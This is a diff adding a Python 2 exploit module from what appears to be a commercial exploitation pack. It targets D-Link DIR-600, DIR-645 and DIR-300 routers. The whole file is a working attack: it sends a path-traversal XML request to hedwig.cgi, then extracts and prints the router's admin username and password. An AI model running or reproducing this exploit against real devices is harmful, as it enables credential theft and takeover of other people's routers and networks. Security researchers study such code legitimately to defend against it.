@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_link_21'
+_vendor_ = 'd-link'
+_model_  = ['DIR-600','DIR-645','DIR-300']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://packetstormsecurity.com/files/145097/dlink-850-admin-creds-retriever.sh.txt'
+_port_   = 55555
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/hedwig.cgi' % (host,port)
+    headers = {'Content-Type': 'text/xml', 'Cookie':'uid=d2d2d2d2'}
+    data = '<?xml version=\'1.0\' encoding=\'utf-8\'?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>\n\n'
+    response = requests.post(url, headers=headers, data=data)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if '<password>' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.search('<name>(.+?)</name>.*?<password>(.+?)</password>', response.text, re.DOTALL)
+    if m is None:
+      print '[+] Credentials not found'
+      print response.text        
+    else:            
+      print 'Login: %s\nPassword: %s\n'%(m.group(1),m.group(2))
+      print '===\n\n%s'%response.text
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
